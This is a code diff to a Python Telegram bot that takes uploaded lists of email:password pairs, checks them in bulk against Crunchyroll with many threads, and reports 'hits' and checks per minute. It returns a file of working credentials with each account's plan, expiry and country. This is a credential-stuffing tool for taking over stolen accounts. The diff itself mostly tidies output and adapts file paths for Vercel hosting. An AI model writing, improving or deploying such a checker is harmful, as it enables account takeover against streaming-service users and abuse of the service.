@@ -367,7 +367,7 @@ async def handle_document(update: Update, context: CallbackContext):
     
     total = len(accounts)
     hits = []
-    start_time = time.time()   # ← Start timer for elapsed & CPM
+    start_time = time.time()
     
     progress_msg = await update.message.reply_text(
         f"🚀 Starting bulk check with <b>{current_threads}</b> threads...\n"
@@ -383,9 +383,9 @@ async def handle_document(update: Update, context: CallbackContext):
     
     with concurrent.futures.ThreadPoolExecutor(max_workers=current_threads) as executor:
         future_to_acc = {executor.submit(check_account, acc): acc for acc in accounts}
-
+        
         for future in concurrent.futures.as_completed(future_to_acc):
-            result = await run_blocking(lambda f: f.result(), future)
+            result = future.result()
             completed += 1
             
             if result['success']:
@@ -402,7 +402,7 @@ async def handle_document(update: Update, context: CallbackContext):
                 except:
                     pass
     
-    # ====================== NEW PREMIUM SCAN COMPLETED SCREEN ======================
+    # ====================== SUMMARY ======================
     elapsed = int(time.time() - start_time)
     cpm = int((total / elapsed) * 60) if elapsed > 0 else 0
     hits_count = len(hits)
@@ -414,30 +414,33 @@ async def handle_document(update: Update, context: CallbackContext):
 📁 <b>File:</b> <code>{document.file_name}</code>
 📊 <b>Processed:</b> <code>{completed}/{total}</code>
 🧵 <b>Threads:</b> <code>{current_threads}</code>
-📡 <b>Mode:</b> <code><b>Crunchyroll Check</b></code>
+📡 <b>Mode:</b> <code>Crunchyroll Check</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ✅ <b>HITS:</b> <code>{hits_count}</code>
 ❌ <b>BAD:</b> <code>{bad_count}</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏱ <b>Elapsed:</b> <code>{elapsed} sec</code>
+⏱ <b>Elapsed:</b> <code>{elapsed}s</code>
 ⚡ <b>CPM:</b> <code>{cpm}</code>
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 """
     await progress_msg.edit_text(summary, parse_mode='HTML')
     
-    # Send Hits File (kept as before)
+    # ====================== SEND HITS FILE ======================
     if hits:
         hits_text = "EMAIL:PASSWORD | PLAN | EXPIRY | COUNTRY\n" + "="*60 + "\n"
         for hit in hits:
             hits_text += f"{hit['email']}:{hit['password']} | {hit['plan']} | {hit['expiry']} | {hit['country']}\n"
         
-        hits_file = f"crunchy_hits_{datetime.now().strftime('%Y%m%d_%H%M')}.txt"
+        # Use /tmp/ folder (important for Vercel)
+        hits_file = f"/tmp/crunchy_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        
         with open(hits_file, "w", encoding="utf-8") as f:
             f.write(hits_text)
         
         await update.message.reply_document(
             document=open(hits_file, "rb"),
-            caption=f"🎉 <b>{hits_count} HIT(S) FOUND!</b>",
+            filename=f"crunchy_hits_{datetime.now().strftime('%Y%m%d_%H%M')}.txt",
+            caption=f"🎉 <b>{hits_count} HIT(S) FOUND!</b>\n\nChecked with {current_threads} threads.",
             parse_mode='HTML'
         )
 
